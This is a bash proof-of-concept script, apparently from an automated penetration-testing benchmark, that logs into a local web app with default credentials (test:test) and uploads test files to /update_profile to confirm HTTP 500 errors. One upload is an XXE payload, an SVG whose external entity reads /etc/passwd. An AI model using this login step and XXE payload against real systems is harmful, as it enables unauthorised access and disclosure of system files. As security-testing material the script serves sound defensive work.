#!/bin/bash
# POC: Demonstrates HTTP 500 Internal Server Error for authenticated file uploads to /update_profile endpoint by first authenticating with default credentials
# Target: ./repo
# Created: 2025-11-07T16:11:27.148Z
# Session: benchmark-XBEN-022-24-mhp1ee6o

# File Upload Backend Processing Error POC (v2)
# Authenticates with default credentials, then tests file uploads
# Tests that /update_profile endpoint returns HTTP 500 for all file uploads

TARGET_URL="${1:-http://localhost}"
LOGIN_ENDPOINT="/login"
UPDATE_ENDPOINT="/update_profile"
COOKIES_FILE="/tmp/cookies.txt"

echo "=========================================="
echo "File Upload Backend Error POC (Authenticated)"
echo "=========================================="
echo "Target: $TARGET_URL"
echo ""

# Step 1: Authenticate with default credentials
echo "[*] Step 1: Authenticating with default credentials (test:test)..."
curl -s -c "$COOKIES_FILE" -d "user=test&password=test" "$TARGET_URL$LOGIN_ENDPOINT" > /dev/null
echo "[+] Authentication attempted. Cookie saved."
echo ""

# Create test files in /tmp
echo "[*] Creating test files..."
echo "PNG test" > /tmp/test.png 2>/dev/null
echo "" > /tmp/empty.png 2>/dev/null
echo "This is a text file" > /tmp/test.txt 2>/dev/null
echo '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>' > /tmp/xxe.svg 2>/dev/null
echo "[+] Test files created in /tmp"
echo ""

# Test file uploads with authentication
echo "=========================================="
echo "FILE UPLOAD TESTS (Authenticated)"
echo "=========================================="
echo ""

echo "Test 1: Valid PNG file upload"
echo "Command: curl -b $COOKIES_FILE -F 'image_profile=@/tmp/test.png' -w '\nHTTP Status: %{http_code}\n' $TARGET_URL$UPDATE_ENDPOINT"
echo ""
RESPONSE=$(curl -s -b "$COOKIES_FILE" -F 'image_profile=@/tmp/test.png' -w '\nHTTP_STATUS:%{http_code}' "$TARGET_URL$UPDATE_ENDPOINT")
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_STATUS:" | cut -d: -f2)
echo "$RESPONSE" | head -20
echo "HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "500" ]; then
    echo "✓ CONFIRMED: HTTP 500 error on valid PNG upload"
    FOUND_500=1
else
    echo "✗ Expected 500, got $HTTP_CODE"
fi
echo ""

echo "Test 2: Empty file upload"
echo "Command: curl -b $COOKIES_FILE -F 'image_profile=@/tmp/empty.png' -w '\nHTTP Status: %{http_code}\n' $TARGET_URL$UPDATE_ENDPOINT"
echo ""
RESPONSE=$(curl -s -b "$COOKIES_FILE" -F 'image_profile=@/tmp/empty.png' -w '\nHTTP_STATUS:%{http_code}' "$TARGET_URL$UPDATE_ENDPOINT")
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_STATUS:" | cut -d: -f2)
echo "$RESPONSE" | head -20
echo "HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "500" ]; then
    echo "✓ CONFIRMED: HTTP 500 error on empty file upload"
    FOUND_500=1
else
    echo "✗ Expected 500, got $HTTP_CODE"
fi
echo ""

echo "Test 3: Text file upload"
echo "Command: curl -b $COOKIES_FILE -F 'image_profile=@/tmp/test.txt' -w '\nHTTP Status: %{http_code}\n' $TARGET_URL$UPDATE_ENDPOINT"
echo ""
RESPONSE=$(curl -s -b "$COOKIES_FILE" -F 'image_profile=@/tmp/test.txt' -w '\nHTTP_STATUS:%{http_code}' "$TARGET_URL$UPDATE_ENDPOINT")
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_STATUS:" | cut -d: -f2)
echo "$RESPONSE" | head -20
echo "HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "500" ]; then
    echo "✓ CONFIRMED: HTTP 500 error on text file upload"
    FOUND_500=1
else
    echo "✗ Expected 500, got $HTTP_CODE"
fi
echo ""

echo "Test 4: SVG with XXE payload"
echo "Command: curl -b $COOKIES_FILE -F 'image_profile=@/tmp/xxe.svg' -w '\nHTTP Status: %{http_code}\n' $TARGET_URL$UPDATE_ENDPOINT"
echo ""
RESPONSE=$(curl -s -b "$COOKIES_FILE" -F 'image_profile=@/tmp/xxe.svg' -w '\nHTTP_STATUS:%{http_code}' "$TARGET_URL$UPDATE_ENDPOINT")
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_STATUS:" | cut -d: -f2)
echo "$RESPONSE" | head -20
echo "HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "500" ]; then
    echo "✓ CONFIRMED: HTTP 500 error on SVG file upload"
    FOUND_500=1
else
    echo "✗ Expected 500, got $HTTP_CODE"
fi
echo ""

echo "Test 5: Detailed verbose response"
echo "Command: curl -v -b $COOKIES_FILE -F 'image_profile=@/tmp/test.png' $TARGET_URL$UPDATE_ENDPOINT"
echo ""
curl -v -b "$COOKIES_FILE" -F 'image_profile=@/tmp/test.png' "$TARGET_URL$UPDATE_ENDPOINT" 2>&1 | head -50
echo ""

echo "=========================================="
if [ "$FOUND_500" = "1" ]; then
    echo "✓ SUCCESS: Found HTTP 500 errors on file uploads"
    echo "This indicates an unhandled exception in backend file processing"
else
    echo "Note: Current status codes differ from expected 500"
    echo "The vulnerability may manifest differently in this environment"
fi
echo "=========================================="

# Cleanup
rm -f "$COOKIES_FILE"